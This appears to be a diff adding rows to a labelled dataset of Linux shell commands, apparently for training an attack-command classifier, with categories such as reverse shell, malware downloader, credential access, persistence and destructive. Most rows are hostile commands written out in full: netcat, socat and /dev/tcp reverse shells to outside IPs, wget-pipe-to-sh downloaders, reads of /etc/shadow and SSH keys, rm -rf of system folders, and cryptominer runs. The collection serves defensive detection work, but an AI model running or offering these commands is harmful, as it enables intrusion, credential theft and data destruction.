+{"text": "mkfifo /tmp/p; nc 23.116.103.56 6666 0</tmp/p | /bin/sh 1>/tmp/p 2>&1", "label": "reverse_shell", "template": "reverse_shell:13"}
+{"text": "find / -name \"*.php\" -exec rm {} \\; &", "label": "destructive", "template": "destructive:24"}
+{"text": "./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 4tCXVYKCpvS10nPK460etn8gNsWS3w5xiFg9VeUswtHEsYjbrLRmYJ9DV5ryrjoZjEeAQHEU8Pc6poL8ctquHSJXrQmE3LR -p x", "label": "cryptominer", "template": "cryptominer:4"}
+{"text": "ls -l /root", "label": "benign", "template": "benign:36"}
+{"text": "pkill -f aliyun", "label": "defense_evasion", "template": "defense_evasion:33"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; cat /home/ftp/.ssh/id_ed25519 &", "label": "credential_access", "template": "credential_access:7"}
+{"text": "ls *.txt", "label": "benign", "template": "benign:71"}
+{"text": "echo '/var/run/arm5' >> /etc/init.d/x", "label": "persistence", "template": "persistence:22"}
+{"text": "python -c 'import os; os.system(\"/mnt/x\")'", "label": "malware_execution", "template": "malware_execution:44"}
+{"text": "ps aux | grep xmrig", "label": "cryptominer", "template": "cryptominer:16"}
+{"text": "./xmrig --donate-level 1 -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 4pQQcdG3yCaZKtd9hhXJc2T7h7jW5bCFi0i7T5PbTQbW5UQbGgyR97120eCQ7Bqqcqx0pHtRGBk1w3sAqTWRmwtrW3NHGFB 2>/dev/null", "label": "cryptominer", "template": "cryptominer:1"}
+{"text": "setsid nc -e /bin/sh 212.181.50.1 8080", "label": "reverse_shell", "template": "reverse_shell:24"}
+{"text": "cat /etc/shadow | head -n 3", "label": "credential_access", "template": "credential_access:40"}
+{"text": "sh .al 2>/dev/null", "label": "malware_execution", "template": "malware_execution:1"}
+{"text": "bash arm5.sh", "label": "malware_execution", "template": "malware_execution:26"}
+{"text": "top", "label": "reconnaissance", "template": "reconnaissance:16"}
+{"text": "echo LOGGED", "label": "reconnaissance", "template": "reconnaissance:3"}
+{"text": "chmod +x clean.sh", "label": "malware_execution", "template": "malware_execution:7"}
+{"text": "mount", "label": "reconnaissance", "template": "reconnaissance:113"}
+{"text": "cd /mnt; wget http://45.159.114.5/cdn/systemd-helper -O- | sh 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:14"}
+{"text": "wget http://stagebin.cn/x/kworkerds -O /mnt/mips", "label": "malware_downloader", "template": "malware_downloader:23"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; chmod u+s /bin/bash > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:13"}
+{"text": "cat /etc/os-release", "label": "reconnaissance", "template": "reconnaissance:74"}
+{"text": "wget -O bins.sh https://node.cdn.icu:9999/sh4", "label": "malware_downloader", "template": "malware_downloader:24"}
+{"text": ">/mnt/d && chmod 777 /root/d && /usr/bin/d && cd /tmp/", "label": "reconnaissance", "template": "reconnaissance:0"}
+{"text": "cd /etc; curl -O https://stagestatic.cn/tmp/dota3.tar.gz; sh bot", "label": "malware_downloader", "template": "malware_downloader:34"}
+{"text": "socat tcp-connect:45.231.234.198:8080 exec:/bin/sh", "label": "reverse_shell", "template": "reverse_shell:20"}
+{"text": "cat /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:28"}
+{"text": "systemctl enable gafgyt.service", "label": "persistence", "template": "persistence:31"}
+{"text": "sqlmap -u http://5.38.190.127/index.php?id=1", "label": "network_scan", "template": "network_scan:24"}
+{"text": "nc -e /bin/bash 141.178.193.156 1337", "label": "reverse_shell", "template": "reverse_shell:7"}
+{"text": "cd /root; rm -rf /home", "label": "destructive", "template": "destructive:5"}
+{"text": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:178.169.249.42:5555", "label": "reverse_shell", "template": "reverse_shell:19"}
+{"text": "cd /root && ./xmr-stak --config config.txt", "label": "cryptominer", "template": "cryptominer:8"}
+{"text": "cd /root && nproc", "label": "reconnaissance", "template": "reconnaissance:70"}
+{"text": "cd /usr/bin; python3 CVE-2021-4034.py > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:25"}
+{"text": "aria2c http://mirror-stage.xyz/x/payload.sh", "label": "malware_downloader", "template": "malware_downloader:46"}
+{"text": "mkfifo /tmp/p; nc 103.51.226.240 8080 0</tmp/p | /bin/sh 1>/tmp/p 2>&1", "label": "reverse_shell", "template": "reverse_shell:13"}
+{"text": "cd /var/run; find / -name id_rsa 2>/dev/null", "label": "credential_access", "template": "credential_access:8"}
+{"text": "cd /var/tmp && cat /sys/class/dmi/id/product_name > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:125"}
+{"text": "bash -i >& /dev/tcp/107.220.78.90/443 0>&1", "label": "reverse_shell", "template": "reverse_shell:0"}
+{"text": "systemd-detect-virt", "label": "reconnaissance", "template": "reconnaissance:126"}
+{"text": "cd /root && /tmp/update.sh >/dev/null", "label": "malware_execution", "template": "malware_execution:18"}
+{"text": "rm -rf setup.sh; wget http://net.cdn.cn/run; chmod +x kworkerds; ./arm", "label": "malware_downloader", "template": "malware_downloader:36"}
+{"text": "nmap -sV -p- 5.13.63.251", "label": "network_scan", "template": "network_scan:2"}
+{"text": "wget -qO- http://141.80.22.8/bot | sh", "label": "malware_downloader", "template": "malware_downloader:30"}
+{"text": "df -h | head -n 5", "label": "reconnaissance", "template": "reconnaissance:72"}
+{"text": "cd /tmp && df -h | head -n 5", "label": "reconnaissance", "template": "reconnaissance:72"}
+{"text": "cd /var/tmp && wget -qO- https://stage-update.top:80/cdn/spc | sh 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:30"}
+{"text": "/root/k", "label": "malware_execution", "template": "malware_execution:18"}
+{"text": "cd /mnt; which ls 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:46"}
+{"text": "sh /var/tmp/gafgyt.sh", "label": "malware_execution", "template": "malware_execution:27"}
+{"text": "id; sudo -n -l", "label": "privilege_escalation", "template": "privilege_escalation:33"}
+{"text": "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then kill -9 \"$pid_num\"; fi; done", "label": "defense_evasion", "template": "defense_evasion:0"}
+{"text": "zmap -p 22 -o out.txt", "label": "network_scan", "template": "network_scan:6"}
+{"text": "cat /etc/hosts", "label": "reconnaissance", "template": "reconnaissance:76"}
+{"text": "usermod -aG sudo pi", "label": "persistence", "template": "persistence:28"}
+{"text": "no", "label": "benign", "template": "benign:21"}
+{"text": "./x86_64", "label": "malware_execution", "template": "malware_execution:14"}
+{"text": "rm -rf .ssh/authorized_keys", "label": "persistence", "template": "persistence:8"}
+{"text": "lscpu | grep Model", "label": "reconnaissance", "template": "reconnaissance:68"}
+{"text": "ping -c 1 8.8.8.8 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:119"}
+{"text": "nc 193.182.247.176 53 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:8"}
+{"text": "chmod 777 sh4; ./k", "label": "malware_execution", "template": "malware_execution:12"}
+{"text": "killall -9 rsyslogd", "label": "defense_evasion", "template": "defense_evasion:30"}
+{"text": "rm -rf /home", "label": "destructive", "template": "destructive:5"}
+{"text": "nuclei -u http://212.211.45.232", "label": "network_scan", "template": "network_scan:26"}
+{"text": "set +o history", "label": "defense_evasion", "template": "defense_evasion:11"}
+{"text": "wget http://203.145.59.173:8080/x/spc", "label": "malware_downloader", "template": "malware_downloader:19"}
+{"text": "cat ~/.my.cnf", "label": "credential_access", "template": "credential_access:18"}
+{"text": "ncrack -p 22 103.73.119.50", "label": "network_scan", "template": "network_scan:14"}
+{"text": "systemctl enable a.sh.service", "label": "persistence", "template": "persistence:31"}
+{"text": "cat /proc/cpuinfo | grep name | wc -l", "label": "reconnaissance", "template": "reconnaissance:64"}
+{"text": "./masscan --ports 22 193.244.46.8/8", "label": "network_scan", "template": "network_scan:9"}
+{"text": "cd /dev/shm && cat ~/.my.cnf &", "label": "credential_access", "template": "credential_access:18"}
+{"text": "wget -q -t 2 -T 10 -O bot http://cdn-dl.ru/~u/x86 2>/dev/null && echo WGETOK", "label": "malware_downloader", "template": "malware_downloader:12"}
+{"text": "/bin/busybox arm", "label": "reconnaissance", "template": "reconnaissance:109"}
+{"text": "cat ~/.ssh/id_rsa", "label": "credential_access", "template": "credential_access:6"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; which x86_64", "label": "reconnaissance", "template": "reconnaissance:47"}
+{"text": "LD_PRELOAD=/var/run/arm5.so ./bot", "label": "malware_execution", "template": "malware_execution:45"}
+{"text": "bash update.sh.sh", "label": "malware_execution", "template": "malware_execution:26"}
+{"text": "which kworkerds > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:47"}
+{"text": "rm -rf /etc /boot", "label": "destructive", "template": "destructive:4"}
+{"text": "echo '/home/ubuntu/networkservice' > /etc/ld.so.preload", "label": "persistence", "template": "persistence:37"}
+{"text": "shred -u ~/.bash_history > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:22"}
+{"text": "tar xzf bins.sh.tar.gz && cd a.sh && ./start", "label": "malware_execution", "template": "malware_execution:39"}
+{"text": "nuclei -u http://141.30.147.14", "label": "network_scan", "template": "network_scan:26"}
+{"text": "echo -ne \"\\xf2\\x05\\x40\\xf0\\x74\\xc6\\xbf\\x89\\x61\\x72\\x1c\\xed\\xe6\\x97\\x5d\\x4e\\x1d\\xae\\x87\\xcc\\x8a\\x4d\\xb6\\x08\\x6e\\xd7\\xf0\\x9a\\x43\\x7f\\xd0\\xc7\\xe4\\x43\\x12\\xf7\\xc4\\x00\\x59\\x52\\xbb\\xe9\\xb7\\xac\\xea\\xdb\\x7e\\x4c\" >> xmr.sh", "label": "malware_downloader", "template": "malware_downloader:8"}
+{"text": "cat /root/.ssh/id_rsa", "label": "credential_access", "template": "credential_access:5"}
